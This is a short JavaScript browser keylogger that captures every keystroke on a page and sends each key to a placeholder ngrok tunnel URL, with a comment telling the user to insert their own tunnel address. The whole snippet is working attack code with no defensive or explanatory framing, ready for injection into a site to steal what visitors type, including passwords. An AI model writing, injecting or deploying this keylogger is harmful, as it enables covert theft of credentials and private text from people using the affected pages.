document.addEventListener("keydown", sendKeys);
var ngrokURL = "your_ngrok_tunnel_url_here";  // PUT YOUR NGROK TUNNEL URL HERE
function sendKeys(e){
  var xhr = new XMLHttpRequest();
  xhr.open("GET", ngrokURL + "?key=" + e["key"], true);
  xhr.send();
}
